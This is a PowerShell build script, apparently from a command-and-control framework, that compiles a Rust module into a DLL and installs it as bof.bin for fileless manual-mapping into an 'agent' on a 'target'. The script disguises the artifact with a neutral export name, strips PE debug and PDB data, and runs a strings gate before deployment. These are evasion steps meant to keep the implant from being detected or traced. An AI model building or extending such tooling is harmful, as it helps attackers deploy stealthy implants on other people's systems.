# Build L2 classic BOF module (Manual-Map PE) → storage/modules/bof.bin
#
# Artifact: app_rt.dll (neutral export name; cupcake-mod-bof crate)
# Post: pe-strip-debug.py + strings-gate.ps1
#
# Usage: powershell -File scripts/build-bof-module.ps1
param(
    [switch]$SkipGate
)

$ErrorActionPreference = 'Stop'
$ServerRoot = Split-Path -Parent $PSScriptRoot
$RepoRoot   = Split-Path -Parent $ServerRoot
$ClientRoot = Join-Path $RepoRoot 'Client'
$OutDir     = Join-Path $ServerRoot 'storage\modules'
$Pkg        = 'cupcake-mod-bof'
$SrcName    = 'app_rt.dll'
$DstName    = 'bof.bin'
$StripPy    = Join-Path $PSScriptRoot 'pe-strip-debug.py'
$Gate       = Join-Path $ClientRoot 'scripts\strings-gate.ps1'

if (-not (Test-Path $ClientRoot)) { throw "Client tree not found: $ClientRoot" }

Write-Host "[*] cargo build -p $Pkg --release"
Push-Location $ClientRoot
try {
    $env:RUSTFLAGS = "--remap-path-prefix `"$ClientRoot`"=."
    cargo build -p $Pkg --release
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
} finally {
    Pop-Location
}

$src = Join-Path $ClientRoot "target\release\$SrcName"
if (-not (Test-Path $src)) { throw "built DLL not found: $src" }

New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$dst = Join-Path $OutDir $DstName
Copy-Item -Force $src $dst

if (Test-Path $StripPy) {
    Write-Host '[*] stripping PE debug directory (RSDS/PDB)'
    python $StripPy $dst
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
}

Write-Host "[+] Installed $dst ($((Get-Item $dst).Length) bytes)"
Write-Host '    Manual-Map into agent (fileless); no temp DLL on target.'

if (-not $SkipGate -and (Test-Path $Gate)) {
    & $Gate -Path $dst
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
}
